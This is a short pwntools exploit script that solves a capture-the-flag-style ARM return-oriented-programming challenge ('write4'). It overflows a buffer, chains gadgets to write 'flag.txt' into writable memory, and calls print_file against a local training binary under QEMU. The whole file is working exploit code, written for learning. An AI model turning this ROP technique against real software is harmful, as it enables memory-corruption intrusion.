#!/usr/bin/env python3
from pwn import *

context.arch   = 'arm'
context.bits   = 32
context.endian = 'little'
# context.log_level = 'debug'

BINARY = './write4_armv5-hf'

OFFSET = 36

WRITE   = 0x000105ec   # str r3, [r4] ; ldmia sp!, {r3, r4, pc}
PRIME   = 0x000105f0   # ldmia sp!, {r3, r4, pc}   (amorce le 1er r3/r4)

POP_R0  = 0x000105f3   # pop.w {r0, pc}

DATA        = 0x00021024   # .data : writable, adresse fixe
PRINT_FILE  = 0x000104bc   # print_file@plt  (ARM -> pair)

PAD = 0x41414141


def write_string(addr, s):
    if len(s) % 4:
        s += b'\x00' * (4 - len(s) % 4)
    chain  = p32(PRIME)
    for i in range(0, len(s), 4):
        word = u32(s[i:i+4])
        chain += p32(word) + p32(addr + i) + p32(WRITE)  # r3=mot, r4=cible, pc=WRITE
    chain += p32(PAD) + p32(PAD) + p32(POP_R0)
    return chain


payload  = b'A' * OFFSET
payload += write_string(DATA, b'flag.txt\x00')
payload += p32(DATA)
payload += p32(PRINT_FILE)

assert len(payload) <= 0x200, "payload > 0x200 octets"
log.info("payload = %d octets" % len(payload))

p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabihf/',
             '-E', 'LD_LIBRARY_PATH=.', BINARY])
p.send(payload)
print(p.recvall(timeout=3).decode(errors='replace'))
